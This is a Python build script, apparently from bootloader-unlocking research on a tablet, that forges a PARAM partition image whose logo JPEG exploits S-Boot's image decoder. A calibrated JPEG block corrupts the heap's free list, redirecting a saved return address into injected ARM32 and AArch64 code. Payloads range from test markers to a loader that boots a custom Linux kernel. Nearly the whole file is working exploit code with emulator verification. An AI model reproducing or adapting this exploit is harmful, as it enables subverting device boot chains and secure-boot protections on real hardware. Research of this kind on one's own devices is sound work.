#!/usr/bin/env python3

# SPDX-License-Identifier: MIT
# Copyright (c) 2026 elkir0

"""Build the split PARAM from a block calibrated against S-Boot's decoder.

    venv/bin/python -I scripts/build_ffree.py STOCK_PARAM OUT_PARAM [--node 0x24220000] [--verify]

The logo is 310 x 13501: black, except the block at (band 1687, column 38) whose coefficients come
from out/calibrated_block.json (scripts/sboot_calib.py), which S-Boot's own decoder turns into
the heap head's 16 bytes at 0x24F00000 (row 13500, byte 912) followed by three spill bytes:
{size 0, free byte 0 = busy, prev, next = F}. F (file offset 0x20000) is a false free block whose
size makes malloc carve at 0x23EC0008, and whose next is F2 = F + 0x100, the code node. So the
walk is B0 (busy, skipped) > F (free, huge) > F2 (busy) > head, and nothing else in the heap
matters. When 0x23e17b20 (called by `boot` at 0x23E069D8) returns, pc = F2.

--verify decodes the whole logo with S-Boot's decoder in the emulator (about 75 s) and shows the
bytes S-Boot will really leave at 0x24F00000.
"""
from __future__ import annotations

import argparse
import hashlib
import io
import json
import struct
import subprocess
import sys
import time
from pathlib import Path

from capstone import CS_ARCH_ARM, CS_ARCH_ARM64, CS_MODE_ARM, Cs
from PIL import Image

sys.path.insert(0, str(Path(__file__).resolve().parent))
import build_b0 as b0  # noqa: E402
import build_calib as bc  # noqa: E402
import build_hijack as bh  # noqa: E402
import build_split as bs  # noqa: E402
import sboot_calib as c  # noqa: E402
import jpegforge as jf  # noqa: E402
import split_source  # noqa: E402

WIDTH, HEIGHT = 310, 13501
STRIDE = (WIDTH * 3 + 3) & ~3
HEADER_ROW, HEADER_BYTE = HEIGHT - 1, 912
BLOCK_ROW, BLOCK_COL = HEADER_ROW // 8, HEADER_BYTE // 24
HEAD = bs.HEAD
B0 = bs.B0
NEED = bs.NEED
TARGET = bs.SAVED_LR - 12
A64_TEXTS_OFF, A64_CODE_OFF = 0x400, 0x480          # from the node: the three texts, then (aligned at 0x80) the code
A64_TEXTS = (b"HIJACK2: AArch64 code is running: CurrentEL=", b" DAIF=", b"\n")
SRESET_A64_OFF = 0x800                              # sreset payload: the AArch64 code, with its own texts, after the ARM32 code
PARAM_SECTOR = 92160                                 # where PARAM starts on the eMMC, in 512-byte sectors
PARAM_LOGO_AT = 0x98E00                              # logo.jpg's header in PARAM's tar (after download.jpg): its data 0x200 later
EL1_LOGO_OFFSET = 0x38000                            # the image for EL1 in the logo file: past stage 2 and its 64 KiB of .bss,
                                                     # and on a sector of PARAM
STAGE2_BSS = 0x10000
EL1_SECTOR = PARAM_SECTOR + (PARAM_LOGO_AT + 0x200 + EL1_LOGO_OFFSET) // 512
assert (PARAM_LOGO_AT + 0x200 + EL1_LOGO_OFFSET) % 512 == 0
EMMC_BYTES = 0x100000                                # the first read: the start of PARAM to 0x40000000
SBOOT_DATA_AT = 0x700000                              # the last 1 MiB of PARAM is S-Boot's own: the environment it rewrites at every
                                                      # boot (0x1a28 bytes at 0x700000), the command line, records.  Its reader of the
                                                      # archive (0x23e0a4bc) walks the headers from the first sector and stops at the
                                                      # first block without a name or without "ustar", so nothing between the end
                                                      # of the archive and 0x700000 is ever looked at (2026-11-24)
SBOOT_DATA_MARGIN = 0x40000                           # kept free in front of S-Boot's data
KBOOT_A64_OFF = 0x2000                                # the production loader: its AArch64 entry, after 7.5 KiB of ARM32 code
CACHE_SECTOR = 6553600                                # where the CACHE partition starts on the eMMC (200 MiB)
CACHE_FS_SECTORS = 131072                             # the first 64 MiB stay an ext4 for Android (/cache); the rest is raw
SLOT_SECTORS = 131072                                 # a slot: 64 MiB
SLOT_REL = {"A": CACHE_FS_SECTORS, "B": CACHE_FS_SECTORS + SLOT_SECTORS}   # in sectors of the partition: 64 MiB and 128 MiB
SLOT_MAGIC, SLOT_HEADER_BYTES = 0x314B3754, 0x1000    # "T7K1"
KERNEL_AT, DTB_AT = 0x42000000, 0x5F000000            # where the loader puts them (the header says the same)
KBOOT_RECORD_AT, KBOOT_RECORD_MAGIC = 0x40003000, 0x524B3754   # the record the ARM32 code hands stage 2 ("T7KR"; 16 words:
                                                      # the chosen header's 0x38 bytes, its first sector, the magic); the same
                                                      # address and magic in split_source.KBOOT_SOURCE and stage2.c (SLOT_RECORD)
KBOOT_RECORD_WORDS = 16


def build_a64(work: Path, node: int) -> bytes:
    """The AArch64 entry: the three texts at node + 0x400, the code of scripts/a64_marker.S at node + 0x480."""
    base = node + A64_TEXTS_OFF
    ends, at = [], base
    for text in A64_TEXTS:
        at += len(text)
        ends.append(at)
    defines = {}
    for name, address in (("TEXT1", base), ("TEXT1_END", ends[0]), ("TEXT2", ends[0]), ("TEXT2_END", ends[1]),
                          ("TEXT3", ends[1]), ("TEXT3_END", ends[2])):
        defines[f"-D{name}_LO"] = hex(address & 0xFFFF)
        defines[f"-D{name}_HI"] = hex(address >> 16)
    command = ["clang", "--target=aarch64-none-elf", "-mcpu=cortex-a53", "-fno-asynchronous-unwind-tables", "-c",
               "-o", str(work / "a64.o"), str(Path(__file__).resolve().parent / "a64_marker.S")]
    for key, value in defines.items():
        command.append(f"{key}={value}")
    subprocess.run(command, check=True)
    code = bh.elf_text(work / "a64.o")
    a64 = Cs(CS_ARCH_ARM64, CS_MODE_ARM)
    print(f"AArch64 entry at {node + A64_CODE_OFF:#010x} ({len(code)} bytes), read back:")
    for ins in a64.disasm(code, node + A64_CODE_OFF):
        print(f"    {ins.address:08x}  {ins.mnemonic:10s} {ins.op_str}")
    first = next(a64.disasm(code, node + A64_CODE_OFF))
    if first.mnemonic != "msr" or len(code) > 0x180:
        raise SystemExit("the AArch64 code is not as expected")
    return b"".join(A64_TEXTS) + bytes(A64_CODE_OFF - A64_TEXTS_OFF - sum(len(t) for t in A64_TEXTS)) + code


def build_sreset(work: Path, node: int, marker: str, counter: bool = False, vectors: bool = False, mmu: bool = False,
                 stage2: bool = False, kboot: bool = False, smp: bool = False) -> bytes:
    """The AArch64 entry of the self-resetting test: scripts/a64_sreset.S with the image's marker,
    placed at node + SRESET_A64_OFF. Its texts are its own, so nothing has to be passed by address.
    The options are the file's: counter (read the generic counter, which reads as 0 on this tablet),
    vectors (a vector table at EL2: an exception is logged, not a jump to address 0), mmu (the MMU
    and the caches at EL2, identity map), stage2 (call the C code placed at file offset 0x24000),
    smp (SMPX: the 2 MiB at 0x41000000 mapped without cache, for the stubs of a secondary core)."""
    template = Path(__file__).resolve().parent / "a64_sreset.S"
    source = work / "a64_sreset.S"
    source.write_text(template.read_text().replace("@MARKER@", marker))
    options = [name for name, on in (("COUNTER_READS", counter), ("VECTORS", vectors), ("MMU", mmu), ("STAGE2", stage2),
                                      ("KBOOT", kboot), ("SMPX", smp)) if on]
    subprocess.run(["clang", "--target=aarch64-none-elf", "-mcpu=cortex-a53", "-fno-asynchronous-unwind-tables", "-c",
                    "-o", str(work / "a64sreset.o"), str(source)] + [f"-D{name}" for name in options], check=True)
    code = bh.elf_text(work / "a64sreset.o")
    base = node + SRESET_A64_OFF
    a64 = Cs(CS_ARCH_ARM64, CS_MODE_ARM)
    texts = code.index(marker.encode())                 # the instructions, then the texts
    print(f"AArch64 entry at {base:#010x} ({len(code)} bytes, {texts} of code), read back:")
    for ins in a64.disasm(code[:texts], base):
        print(f"    {ins.address:08x}  {ins.mnemonic:10s} {ins.op_str}")
    if next(a64.disasm(code[:4], base)).mnemonic != "msr" or texts > 0x1000 or texts % 4:
        raise SystemExit("the AArch64 code is not as expected")
    if "VECTORS" in options:                          # the table follows the texts at the next 2 KiB boundary
        slot = (texts + 0x7FF) & ~0x7FF
        first = next(a64.disasm(code[slot:slot + 4], base + slot))
        if (base + slot) & 0x7FF or first.mnemonic != "b":
            raise SystemExit(f"the vector table is at {base + slot:#010x} ({first.mnemonic}): not a 2 KiB aligned table of branches")
        print(f"    vector table at {base + slot:#010x} (2 KiB aligned): 16 slots, each {first.mnemonic} {first.op_str}; "
              f"the blob ends at {base + len(code):#010x}")
    return code


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    parser.add_argument("stock_param", type=Path)
    parser.add_argument("out_param", type=Path)
    parser.add_argument("--node", type=lambda t: int(t, 0), default=0x24220000)
    parser.add_argument("--verify", action="store_true")
    parser.add_argument("--payload", choices=["mark", "smc", "sreset", "kboot"], default="mark",
                        help="mark: paint, log, hand back; smc: then call the monitor; sreset: the AArch64 code logs the "
                             "state of EL2 and resets the SoC, and the next boot skips the test; kboot: the production "
                             "loader (the kernel in the CACHE slots, the ledger in S-Boot's log ring)")
    parser.add_argument("--marker", help="kboot: the prefix of the AArch64 code's lines (default 'KBOOT: EL2')")
    parser.add_argument("--id", type=lambda t: int(t, 0), default=None, help="sreset: the image's marker, 32 bits (default: the clock)")
    parser.add_argument("--counter", action="store_true", help="sreset: the AArch64 code also reads the generic counter")
    parser.add_argument("--vectors", action="store_true", help="sreset: a vector table at EL2, so that an exception is logged")
    parser.add_argument("--mmu", action="store_true", help="sreset: the MMU and the caches at EL2, identity map")
    parser.add_argument("--stage2", type=Path, help="sreset: a stage 2 built by scripts/build_stage2.py, placed at file offset 0x24000")
    parser.add_argument("--smp", action="store_true",
                        help="sreset, with --stage2: the 2 MiB at 0x41000000 are mapped without cache (the stubs a secondary core runs; stage2.c SMP_EXP)")
    parser.add_argument("--emmc", action="store_true", help="sreset: the ARM32 code makes S-Boot's reader load the start of PARAM at 0x40000000")
    parser.add_argument("--el1", type=Path, help="sreset: an AArch64 image for EL1 (scripts/build_el1.py): stored in the logo, loaded to 0x40080000, entered by stage 2")
    parser.add_argument("--kernel", type=Path, help="sreset: an arm64 Linux Image, and (with --dtb) written into --bundle")
    parser.add_argument("--dtb", type=Path, help="sreset: the device tree blob that goes with --kernel")
    parser.add_argument("--bundle", type=Path, help="sreset: where to write the kernel then the device tree, each in whole sectors")
    parser.add_argument("--kernel-at", type=lambda t: int(t, 0), default=0x42000000)
    parser.add_argument("--dtb-at", type=lambda t: int(t, 0), default=0x5F000000)
    parser.add_argument("--kernel-sector", type=lambda t: int(t, 0), help="the eMMC sector (512 bytes) where the bundle is stored elsewhere")
    parser.add_argument("--kernel-in-param", type=lambda t: int(t, 0),
                        help="store the bundle in this image, at this byte offset of PARAM: in the room between the end of the "
                             "archive and S-Boot's data (0x700000), which S-Boot never reads (the sector follows)")
    parser.add_argument("--out-jpeg", type=Path)
    args = parser.parse_args()
    assert HEADER_ROW * STRIDE + HEADER_BYTE == B0 - bc.DECODE_BUFFER
    coefs = json.loads((Path(__file__).resolve().parent.parent / "out" / "calibrated_block.json").read_text())

    # the code: node F2 at node + 0x100, the code at F2 + 16
    work = args.out_param.parent
    a64_off = A64_TEXTS_OFF
    if args.payload == "kboot":
        marker = args.marker or "KBOOT: EL2"
        a64, a64_off = build_sreset(work, args.node, marker, False, True, True, args.stage2 is not None, True), KBOOT_A64_OFF
        source = (split_source.KBOOT_SOURCE.replace("@SLOT_A@", str(CACHE_SECTOR + SLOT_REL["A"]))
                  .replace("@SLOT_B@", str(CACHE_SECTOR + SLOT_REL["B"])))
        defines = ["-DA64_ENTRY=" + hex(args.node + a64_off)]
        print(f"the production loader: the kernel in CACHE (sector {CACHE_SECTOR}), slot A at sector "
              f"{CACHE_SECTOR + SLOT_REL['A']}, slot B at sector {CACHE_SECTOR + SLOT_REL['B']}, {SLOT_SECTORS * 512 // 1048576} MiB each; "
              f"the AArch64 entry at {args.node + a64_off:#010x}")
    elif args.payload == "smc":
        a64 = build_a64(work, args.node)
        source, defines = split_source.SMC_SOURCE, ["-DA64_ENTRY=" + hex(args.node + A64_CODE_OFF)]
    elif args.payload == "sreset":
        marker = f"HIJACK3: {(args.id if args.id is not None else int(time.time())) & 0xFFFFFFFF:08x}"
        if args.smp and (not args.stage2 or args.emmc or args.el1 or args.kernel):
            raise SystemExit("--smp goes with --stage2 alone: the block at 0x41000000 is the secondary core's")
        a64, a64_off = build_sreset(work, args.node, marker, args.counter, args.vectors, args.mmu, args.stage2 is not None,
                                    False, args.smp), SRESET_A64_OFF
        block = ""
        if args.emmc or args.el1:
            block = split_source.EMMC_READ
        if args.el1:                                     # the AArch64 image for EL1, read the same way to 0x40080000
            image = args.el1.read_bytes()
            sectors = -(-len(image) // 512)
            if args.emmc and len(image) > EMMC_BYTES:
                raise SystemExit("the image for EL1 does not fit between 0x40080000 and the end of the first read")
            block += (split_source.EMMC_LOAD.replace("@EL1_SECTOR@", str(EL1_SECTOR)).replace("@EL1_BYTES@", hex(sectors * 512))
                      .replace("@EL1_WANTED@", str(sectors)))
        if args.kernel:
            if not (args.dtb and args.bundle and (args.kernel_sector is not None) != (args.kernel_in_param is not None)):
                raise SystemExit("--kernel needs --dtb, --bundle, and one of --kernel-sector and --kernel-in-param")
            kernel, dtb = args.kernel.read_bytes(), args.dtb.read_bytes()
            kernel_sectors, dtb_sectors = -(-len(kernel) // 512), -(-len(dtb) // 512)
            if struct.unpack_from("<I", kernel, 0x38)[0] != 0x644D5241:
                raise SystemExit("the kernel image has no arm64 header")
            bundle = kernel + bytes(kernel_sectors * 512 - len(kernel)) + dtb + bytes(dtb_sectors * 512 - len(dtb))
            args.bundle.write_bytes(bundle)
            if args.kernel_in_param is not None:
                args.kernel_sector = PARAM_SECTOR + args.kernel_in_param // 512
            block += "".join(split_source.KERNEL_LOAD.replace("@K_AT@", hex(args.kernel_at)).replace("@K_SECTOR@", str(args.kernel_sector))
                            .replace("@K_BYTES@", hex(kernel_sectors * 512)).replace("@D_AT@", hex(args.dtb_at))
                            .replace("@D_AT_X@", hex(args.dtb_at)[2:]).replace("@D_SECTOR@", str(args.kernel_sector + kernel_sectors))
                            .replace("@D_BYTES@", hex(dtb_sectors * 512)).replace("@D_WANTED@", str(dtb_sectors)).splitlines(True))
            print(f"bundle {args.bundle.name} ({len(bundle)} bytes): kernel {len(kernel)} bytes = {kernel_sectors} sectors at eMMC sector "
                  f"{args.kernel_sector} -> {args.kernel_at:#010x}; device tree {len(dtb)} bytes = {dtb_sectors} sectors at sector "
                  f"{args.kernel_sector + kernel_sectors} -> {args.dtb_at:#010x}" + (
                  f"; in PARAM at {args.kernel_in_param:#x}, its end at {args.kernel_in_param + len(bundle):#x}" if args.kernel_in_param is not None else ""))
        source = split_source.SRESET_SOURCE.replace("@EMMC@", block)
        source = source.replace("@MARKER@", marker).replace("@MARKLEN@", str(len(marker)))   # after: the block carries the marker too
        defines = ["-DA64_ENTRY=" + hex(args.node + a64_off)]
        print(f"marker of this image: {marker!r} (options: {', '.join(n for n, on in (('counter', args.counter), ('vectors', args.vectors), ('mmu', args.mmu), ('stage2', args.stage2 is not None), ('emmc', args.emmc or args.el1), ('el1', args.el1)) if on) or 'none'})")
    elif args.payload == "mark":
        a64, defines = b"", []
        source = split_source.FFREE_SOURCE
    (work / "mark.S").write_text(source)
    subprocess.run(["clang", "--target=arm-none-eabi", "-mcpu=cortex-a53", "-fno-asynchronous-unwind-tables", "-c",
                    "-o", str(work / "mark.o"), str(work / "mark.S")] + defines, check=True)
    code = bh.elf_text(work / "mark.o")
    code_node = args.node + 0x100
    md = Cs(CS_ARCH_ARM, CS_MODE_ARM)
    first = next(md.disasm(code[:4], code_node))
    if first.mnemonic != "b" or int(first.op_str.lstrip("#"), 0) != code_node + 16 or code[4:16] != struct.pack("<III", 0, 0, HEAD):
        raise SystemExit("the code node is not as expected")
    at = code_node + 16
    while at < code_node + len(code):                      # literal pools stop a linear sweep: skip what is not decoded
        got = False
        for ins in md.disasm(code[at - code_node: at - code_node + 4], at):
            print(f"    {ins.address:08x}  {ins.mnemonic:8s} {ins.op_str}")
            got = ins.mnemonic != "andeq" or ins.op_str != "r0, r0, r0"
        if not got:
            (word,) = struct.unpack_from("<I", code, at - code_node)
            print(f"    {at:08x}  .word     {word:08x}")
        at += 4
    text = code[16:]
    at = text.index(b"KBOOT: try") if args.payload == "kboot" else text.index(b"HIJACK")
    print("    string in the code:", repr(text[at: at + 62]))

    blocks = {}
    black = c.block_coefficients([c.BLACK] * 8)
    for by in range((HEIGHT + 7) // 8):
        for bx in range((WIDTH + 7) // 8):
            blocks[(by, bx)] = black
    blocks[(BLOCK_ROW, BLOCK_COL)] = coefs
    jpeg = jf.encode_jpeg(WIDTH, HEIGHT, blocks)
    if len(jpeg) >= args.node - bh.FILE_BUFFER:
        raise SystemExit(f"the JPEG ({len(jpeg)} bytes) reaches the node's offset")

    block_size = (TARGET - args.node + NEED) & 0xFFFFFFFF
    tail = struct.pack("<IB3xII", block_size, 1, 0, code_node) + bytes(0xF0) + code
    logo = bytearray(jpeg)
    at = args.node - bh.FILE_BUFFER
    logo += bytes(at - len(logo))
    logo[at:at + len(tail)] = tail                      # the node F, then F2 and the ARM32 code at +0x100
    if a64:                                             # the AArch64 texts and code (their offsets from the node: a64_off)
        off = at + a64_off
        if len(jpeg) >= off:
            raise SystemExit(f"the JPEG ({len(jpeg)} bytes) reaches the AArch64 code's offset {off:#x}")
        if at + len(tail) > off:
            raise SystemExit(f"the ARM32 code ({len(tail):#x} bytes from the node) reaches the AArch64 texts")
        logo += bytes(off + len(a64) - len(logo))
        logo[off:off + len(a64)] = a64
    if args.stage2:                                      # stage 2, the C code, at file offset 0x24000 = 0x24224000 once loaded
        stage = args.stage2.read_bytes()
        off = 0x24000
        if at + len(tail) > off or off + len(stage) > bh.FILE_BUFFER_SIZE:
            raise SystemExit("stage 2 does not fit in the file buffer")
        logo += bytes(off + len(stage) - len(logo))
        logo[off:off + len(stage)] = stage
        print(f"stage 2 ({args.stage2.name}, {len(stage)} bytes) at file offset {off:#x} = {bh.FILE_BUFFER + off:#010x}")
    if args.el1:                                         # the AArch64 image for EL1 at file offset EL1_LOGO_OFFSET: a sector of PARAM
        off = EL1_LOGO_OFFSET
        if 0x24000 + len(stage) + STAGE2_BSS + 0x800 > off or off + len(image) > bh.FILE_BUFFER_SIZE:
            raise SystemExit("the image for EL1 does not fit in the file buffer, after stage 2 and its .bss")
        logo += bytes(off + len(image) - len(logo))
        logo[off:off + len(image)] = image
        if (PARAM_LOGO_AT + 0x200 + off) % 512 or struct.unpack_from("<I", image)[0] != 0x54314C45:
            raise SystemExit("the image for EL1 is not on a sector of PARAM, or has no header")
        print(f"the image for EL1 ({args.el1.name}, {len(image)} bytes) at file offset {off:#x} = {bh.FILE_BUFFER + off:#010x}: "
              f"PARAM sector {EL1_SECTOR}, {-(-len(image) // 512)} sectors")
    logo += bytes(-len(logo) % 512)
    if len(logo) > bh.FILE_BUFFER_SIZE:
        raise SystemExit("logo.jpg does not fit the file buffer")

    stock = args.stock_param.read_bytes()
    param = bytearray(bc.replace_logo(stock, bytes(logo)))
    end = max(i for i in range(0, bh.DATA_AT, 512) if any(param[i:i + 512])) + 512
    assert end + 1024 <= bh.DATA_AT, f"the archive reaches {end:#x}, into S-Boot's data"
    param[bh.DATA_AT:] = stock[bh.DATA_AT:]
    if args.kernel and args.kernel_in_param is not None:  # the bundle goes into the room S-Boot never reads
        at, last = args.kernel_in_param, args.kernel_in_param + len(bundle)
        if at % 512:
            raise SystemExit("--kernel-in-param must be a whole number of sectors")
        if at < end + 0x8000:
            raise SystemExit(f"the bundle would start at {at:#x}, too close to the end of the archive ({end:#x})")
        if last + SBOOT_DATA_MARGIN > SBOOT_DATA_AT:
            raise SystemExit(f"the bundle would end at {last:#x}, into the room kept free in front of S-Boot's data ({SBOOT_DATA_AT:#x})")
        if any(stock[at:last]):
            raise SystemExit(f"the stock PARAM is not empty between {at:#x} and {last:#x}")
        if any(param[at:last]):
            raise SystemExit(f"the image is not empty between {at:#x} and {last:#x} before the bundle is added")
        param[at:last] = bundle
        print(f"the bundle is in PARAM at {at:#x}..{last:#x} (eMMC sector {args.kernel_sector}, {len(bundle) // 512} sectors); "
              f"the archive ends at {end:#x}, S-Boot's data starts at {SBOOT_DATA_AT:#x}")
    if len(param) != len(stock):
        raise SystemExit("the image does not have the size of the partition")
    if param[bh.DATA_AT:] != stock[bh.DATA_AT:] and not (args.kernel and args.kernel_in_param is not None):
        raise SystemExit("something past DATA_AT differs from the stock PARAM")
    if param[SBOOT_DATA_AT:] != stock[SBOOT_DATA_AT:]:
        raise SystemExit("something in S-Boot's data area differs from the stock PARAM")
    args.out_param.write_bytes(bytes(param))
    written = args.out_param.read_bytes()
    if args.kernel and args.kernel_in_param is not None and written[args.kernel_in_param:args.kernel_in_param + len(bundle)] != bundle:
        raise SystemExit("the bundle read back from the image is not the bundle")
    if args.out_jpeg:
        args.out_jpeg.write_bytes(bytes(logo))
    print(f"logo {WIDTH}x{HEIGHT}, stride {STRIDE}: {len(jpeg)} bytes of JPEG, file {len(logo)} bytes "
          f"({len(logo) / 512:.0f} sectors); B0 at row {HEADER_ROW} + {HEADER_BYTE} (block {BLOCK_ROW},{BLOCK_COL}); "
          f"F {args.node:#010x} = {{size {block_size:#010x}, free, 0, {code_node:#010x}}}")

    if args.verify:
        import sboot_jpeg_emu as e
        sboot = e.SBoot(e.IMAGE.read_bytes())
        result = sboot.decode(bytes(logo))
        memory = result["memory"]
        header = memory[B0 - bc.DECODE_BUFFER: B0 - bc.DECODE_BUFFER + 24]
        print(f"S-Boot's decoder ({result['instructions']} instructions): image {result['width']}x{result['height']}, "
              f"stride {result['stride']}, bytes at {B0:#010x}: {header[:16].hex(' ')} | spill {header[16:].hex(' ')}")
        size, flag, prev, nxt = struct.unpack("<IB3xII", header[:16])
        print(f"    B0 = {{size {size:#010x}, free byte {flag:#04x}, prev {prev:#010x}, next {nxt:#010x}}}")
        above = [i for i in range(B0 - bc.DECODE_BUFFER + 16, len(memory)) if memory[i]]
        print(f"    non-zero bytes above B0's header: {len(above)}, last at +{above[-1] - (B0 - bc.DECODE_BUFFER) if above else 0}")
    writes = bs.emulate(bytes(header[:16]) if args.verify else bytes(16), bytes(logo), NEED) if args.verify else []
    for what, address, value in writes:
        note = "  <- the saved return address of 0x23e17b20" if address == bs.SAVED_LR else ""
        print(f"    [{address:#010x}] = {value:#010x}   {what}{note}")
    print(f"{args.out_param}: {len(param)} bytes, sha256 {hashlib.sha256(bytes(param)).hexdigest()}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
